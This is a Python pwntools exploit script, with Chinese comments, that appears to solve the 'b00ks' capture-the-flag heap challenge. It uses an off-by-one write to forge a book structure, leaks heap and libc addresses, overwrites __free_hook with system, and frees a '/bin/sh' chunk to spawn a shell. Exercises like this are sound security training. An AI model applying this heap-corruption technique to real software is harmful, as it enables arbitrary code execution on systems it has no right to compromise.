#-*- coding=utf-8 -*-
from pwn import *

context.log_level = 'debug'
p = process('b00ks')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(name, description):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Enter book name size: ')
    p.sendline(str(len(name)))
    p.recvuntil('Enter book name (Max 32 chars): ')
    p.send(name)
    p.recvuntil('Enter book description size: ')
    p.sendline(str(len(description)))
    p.recvuntil('Enter book description: ')
    p.send(description)

def delete(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('id you want to delete: ')
    p.sendline(str(index))

def edit(index, description):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('id you want to edit: ')
    p.sendline(str(index))
    p.recvuntil('new book description: ')
    p.sendline(description)

def show():
    p.recvuntil('> ')
    p.sendline('4')

def change_name(name):
    p.recvuntil('> ')
    p.sendline('5')
    p.recvuntil('Enter author name: ')
    p.sendline(name)

def leak(addr1, addr2):
    payload = 'b'*0xc0 + p64(1) + p64(addr1) + p64(addr2) + p64(0x120)
    edit(1, payload)
    change_name('a'*32)
    show()
    p.recvuntil('Name: ')
    res = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00'))
    return res

#泄露堆地址
p.recvuntil('Enter author name: ')
p.sendline('a'*32)

create('a'*0x20, 'b'*0x120)
show()
p.recvuntil('Author: ')
heap_addr = u64(p.recvuntil('\n')[32:-1].ljust(8, '\x00'))
print "heap_addr: %#x" % heap_addr

#申请一个大内存，是堆以mmap模式进行拓展，进而泄露libc_base
create('a'*0x20, '\x00'*0x21000)
create('/bin/sh\x00', 'b'*0x8)
#heap_addr+0x70是以mmap拓展的堆的地址，将他写入伪造的book结构体的name中，准备泄露该值
#heap_addr_0xe0是chunk3的description指针，为之后任意写做准备
libc_base = leak(heap_addr+0x70, heap_addr+0xe0) - 0x5AD010 #该值需要根据系统修改
print "libc_base: %#x" % libc_base

#计算地址
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
print "system: %#x" % system
print "free_hook: %#x" % free_hook

#之前将chunk3的description指针的地址写到了伪造chunk的description指针处，所以这里将改写chunk3的description指针的值为free_hook
#因为off_one_byte会导致写入时会多往后覆盖一个字节，导致后方的book->size被覆盖为0，所以这里手动多写一个字节'\x08'，以免size被覆盖为0
edit(1, p64(free_hook)+'\x08')
#向free_hook中写入system
edit(3, p64(system))
#事先已经在chunk3的name中放入了/bin/sh\x00
delete(3)
#gdb.attach(p)

p.interactive()

